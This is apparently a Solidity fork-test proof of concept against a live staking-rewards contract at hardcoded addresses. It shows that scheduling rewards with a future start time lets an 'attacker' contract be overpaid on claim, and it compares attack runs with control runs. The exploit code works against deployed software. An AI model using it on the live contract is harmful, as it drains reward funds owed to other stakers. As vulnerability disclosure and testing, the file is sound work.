// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IERC20} from "../src/LendingPool/contracts/external/openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Vm {
    function deal(address account, uint256 newBalance) external;
    function prank(address msgSender) external;
    function prank(address msgSender, address txOrigin) external;
    function startPrank(address msgSender) external;
    function startPrank(address msgSender, address txOrigin) external;
    function stopPrank() external;
    function store(address target, bytes32 slot, bytes32 value) external;
    function warp(uint256 newTimestamp) external;
}

interface ILiveLendingPool {
    function depositAndStake(uint256 reserveId, uint256 amount, address onBehalfOf, uint16 referralCode)
        external
        payable
        returns (uint256);

    function getUnderlyingTokenAddress(uint256 reserveId) external view returns (address);
    function getETokenAddress(uint256 reserveId) external view returns (address);
    function getStakingAddress(uint256 reserveId) external view returns (address);
}

interface ILiveStakingRewards {
    function owner() external view returns (address);
    function totalStaked() external view returns (uint256);
    function balanceOf(address user) external view returns (uint256);
    function setReward(address rewardToken, uint256 startTime, uint256 endTime, uint256 totalRewards) external;
    function rewardData(address rewardToken)
        external
        view
        returns (uint256 startTime, uint256 endTime, uint256 rewardRate, uint256 lastUpdateTime, uint256 rewardPerTokenStored);
    function claim() external;
    function stake(uint256 amount, address onBehalfOf) external;
    function withdraw(uint256 amount, address to) external;
}

contract OrdinaryStaker {
    function depositAndStakeNative(address pool, uint256 reserveId, uint256 amount) external returns (uint256) {
        require(address(this).balance >= amount, "wrong value");
        return ILiveLendingPool(pool).depositAndStake{value: amount}(reserveId, amount, address(this), 0);
    }

    function claim(address staking) external { ILiveStakingRewards(staking).claim(); }
    function withdraw(address staking, uint256 amount) external {
        ILiveStakingRewards(staking).withdraw(amount, address(this));
    }
}

contract StakingRewardsFutureStartForkTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant LENDING_POOL = 0xBB505c54D71E9e599cB8435b4F0cEEc05fC71cbD;
    address constant REWARD_TOKEN = 0xbfD291DA8A403DAAF7e5E9DC1ec0aCEaCd4848B9; // USX
    uint256 constant RESERVE_ID = 1;
    uint256 constant REWARD_FUNDING = 1_000 ether;
    uint256 constant DURATION = 100;

    ILiveLendingPool pool = ILiveLendingPool(LENDING_POOL);
    ILiveStakingRewards staking;
    IERC20 underlying;
    IERC20 eToken;
    OrdinaryStaker attacker;

    struct Observation {
        uint256 principal;
        uint256 t0;
        uint256 start;
        uint256 end;
        uint256 lastUpdate;
        uint256 rate;
        uint256 contractBefore;
        uint256 contractAfter;
        uint256 attackerBefore;
        uint256 attackerAfter;
        uint256 claimTime;
        uint256 paid;
        uint256 totalAtClaim;
        uint256 expectedCorrect;
    }

    event log_named_string(string key, string val);
    event log_named_address(string key, address val);
    event log_named_uint(string key, uint256 val);

    function assertEq(address a, address b, string memory why) internal pure { require(a == b, why); }
    function assertEq(uint256 a, uint256 b, string memory why) internal pure { require(a == b, why); }
    function assertEq(uint256 a, uint256 b) internal pure { require(a == b, "not equal"); }
    function assertGt(uint256 a, uint256 b) internal pure { require(a > b, "not greater"); }

    function _setTokenBalance(address user, uint256 amount) internal {
        // Live USX proxy's _balances mapping is storage slot 52 at the pinned block.
        vm.store(REWARD_TOKEN, keccak256(abi.encode(user, uint256(52))), bytes32(amount));
        assertEq(IERC20(REWARD_TOKEN).balanceOf(user), amount, "token setup failed");
    }

    function _setTokenAllowance(address owner, address spender, uint256 amount) internal {
        bytes32 ownerSlot = keccak256(abi.encode(owner, uint256(53)));
        vm.store(REWARD_TOKEN, keccak256(abi.encode(spender, ownerSlot)), bytes32(amount));
        assertEq(IERC20(REWARD_TOKEN).allowance(owner, spender), amount, "allowance setup failed");
    }

    function setUp() public {
        staking = ILiveStakingRewards(pool.getStakingAddress(RESERVE_ID));
        underlying = IERC20(pool.getUnderlyingTokenAddress(RESERVE_ID));
        eToken = IERC20(pool.getETokenAddress(RESERVE_ID));
        attacker = new OrdinaryStaker();

        assertEq(address(staking), 0x5F8d42635A2fa74D03b5F91c825dE6F44c443dA5, "unexpected deployed pool");
    }

    function _stakePrincipal() internal returns (uint256 principal) {
        uint256 totalBefore = staking.totalStaked();
        vm.deal(address(attacker), 1 ether);
        principal = attacker.depositAndStakeNative(LENDING_POOL, RESERVE_ID, 1 ether);
        assertGt(principal, 0);
        assertEq(staking.balanceOf(address(attacker)), principal);
        assertEq(staking.totalStaked(), totalBefore + principal);
    }

    function _scheduleAndClaim(bool futureStart, string memory label) internal {
        Observation memory o;
        o.principal = _stakePrincipal();
        address owner = staking.owner();
        o.t0 = block.timestamp;
        o.start = futureStart ? o.t0 + 10 : o.t0;
        o.end = o.start + DURATION;

        _setTokenBalance(owner, REWARD_FUNDING);
        _setTokenAllowance(owner, address(staking), REWARD_FUNDING);
        vm.startPrank(owner);
        staking.setReward(REWARD_TOKEN, o.start, o.end, REWARD_FUNDING);
        vm.stopPrank();

        uint256 storedStart;
        uint256 storedEnd;
        (storedStart, storedEnd, o.rate, o.lastUpdate,) = staking.rewardData(REWARD_TOKEN);
        assertEq(storedStart, o.start);
        assertEq(storedEnd, o.end);
        assertEq(o.lastUpdate, o.t0);
        assertEq(o.rate, 10 ether);

        o.contractBefore = IERC20(REWARD_TOKEN).balanceOf(address(staking));
        o.attackerBefore = IERC20(REWARD_TOKEN).balanceOf(address(attacker));
        o.claimTime = o.start + 1;
        vm.warp(o.claimTime);
        attacker.claim(address(staking));
        o.attackerAfter = IERC20(REWARD_TOKEN).balanceOf(address(attacker));
        o.contractAfter = IERC20(REWARD_TOKEN).balanceOf(address(staking));
        o.paid = o.attackerAfter - o.attackerBefore;

        o.totalAtClaim = staking.totalStaked();
        o.expectedCorrect = o.principal * ((10 ether * 1e18) / o.totalAtClaim) / 1e18;
        uint256 elapsed = futureStart ? 11 : 1;
        uint256 expectedPaid = o.principal * ((10 ether * elapsed * 1e18) / o.totalAtClaim) / 1e18;
        assertEq(o.paid, expectedPaid, "wrong pro-rata payment");
        if (futureStart) require(o.paid > o.expectedCorrect, "future-start schedule did not overpay");
        else assertEq(o.paid, o.expectedCorrect, "matched start must pay only elapsed rewards");
        assertEq(o.contractBefore - o.contractAfter, o.paid, "contract loss must equal attacker receipt");

        attacker.withdraw(address(staking), o.principal);
        assertEq(eToken.balanceOf(address(attacker)), o.principal, "principal not recovered");
        assertEq(staking.balanceOf(address(attacker)), 0);

        _emitObservation(label, o);
    }

    function _emitObservation(string memory label, Observation memory o) internal {
        emit log_named_string("scenario", label);
        emit log_named_address("live_staking", address(staking));
        emit log_named_address("reward_token", REWARD_TOKEN);
        emit log_named_uint("T0", o.t0);
        emit log_named_uint("start_time", o.start);
        emit log_named_uint("end_time", o.end);
        emit log_named_uint("last_update_after_setReward", o.lastUpdate);
        emit log_named_uint("claim_time", o.claimTime);
        emit log_named_uint("reward_rate", o.rate);
        emit log_named_uint("attacker_staked_principal", o.principal);
        emit log_named_uint("total_staked_at_claim", o.totalAtClaim);
        emit log_named_uint("attacker_stake_share_1e18", o.principal * 1e18 / o.totalAtClaim);
        emit log_named_uint("staking_reward_balance_before", o.contractBefore);
        emit log_named_uint("staking_reward_balance_after", o.contractAfter);
        emit log_named_uint("attacker_reward_balance_before", o.attackerBefore);
        emit log_named_uint("attacker_reward_balance_after", o.attackerAfter);
        emit log_named_uint("correct_post_start_entitlement", o.expectedCorrect);
        emit log_named_uint("actual_paid", o.paid);
        emit log_named_uint("excess_paid", o.paid - o.expectedCorrect);
        emit log_named_uint("principal_recovered", eToken.balanceOf(address(attacker)));
    }

    function testAttackRun1() public { _scheduleAndClaim(true, "attack-run-1"); }
    function testAttackRun2() public { _scheduleAndClaim(true, "attack-run-2"); }
    function testControlRun1() public { _scheduleAndClaim(false, "control-run-1"); }
    function testControlRun2() public { _scheduleAndClaim(false, "control-run-2"); }
}
